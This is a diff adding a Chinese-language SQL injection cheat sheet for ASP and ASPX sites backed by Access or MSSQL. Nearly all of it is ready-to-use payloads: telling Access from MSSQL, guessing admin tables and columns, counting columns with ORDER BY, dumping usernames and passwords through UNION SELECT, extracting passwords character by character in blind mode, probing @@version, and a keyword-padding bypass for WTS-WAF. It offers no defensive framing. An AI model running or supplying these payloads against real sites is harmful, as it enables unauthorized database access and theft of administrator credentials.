@@ -1,0 +1,85 @@
+1、判断是access还是mssql
+   asp?id=67 and exists(select * from msysobjects)>0 
+   asp?id=67 and exists(select * from sysobjects)>0
+   这两条语句都运行，若是access数据库两条都报错，若是mssql 带有sysobjects的返回正常页面，带有msysobjects返回错误页面
+
+2、判断表名是否存在 admin user name admin_login admin_user，存在则返回正确的页面
+
+   asp?id=67 and exists(select * from admin)
+    
+   判断列名是否存在,在确定admin表名存在的情况下,如果存在username表名则返回正确的页面
+   asp?id=67 and exists(select username from admin)
+
+3、判断当前查询的字段长度,字段长度等于num返回正确页面的最大值
+   order by num 
+
+4、通过union select 联合查询来查询猜解出来的账号密码字段(比如 username,password)如果 num=7 那么
+   执行以下语句看回显在第几个ID上显示
+   union select 1,2,3,4,5,6,7 from admin
+   如果回显是2和3,那么
+   union select 1,username,password,4,5,6,7 from admin
+
+
+
+逐字猜解法   
+已经通过语句 and exists(select username from admin) 和and exists(select password  from admin) 猜解出字段 username password
+1、判断字段的大小
+   and (select top 1 len(password) from admin)>32 
+   and (select top 1 len(password) from admin)=32
+   and (select top 1 len(password) from admin)<32
+   条件满足会返回正确页面
+
+2、一位一位的猜解内容
+   and (select top 1 asc(mid(password,1,1)) from 表)=97 获取第一位内容
+   and (select top 1 asc(mid(password,2,1)) from 表)=97 获取第二位内容
+
+   
+WTS-WAF绕过
+and       --> +and+
+select    --> +select+
+from      --> +from+
+
+
+
+常见表：
+admin | news | links
+
+
+一：
+（1）
+'
+and 1=1 
+（2）
+and exists (select * from admin)  #存在有回显否则返回错误信息
+
+
+
+二：
+（2）
+order by
+
+（3）
+union select * from
+
+(4)
+and select from
+
+(5)
+and 0<>(select count(*) from
+
+(5)
+ and （select top 1 len
+ 
+ (6)
+ and （select top 1 asc（mid
+
+
+aspx+sqlserver
+(1)
+'
+and 1=1
+
+(2)
+and 1=@@version--  #适用于有回显
+
+and substring((select @@version),22,4)='2008'--   #适用于无回显，盲注
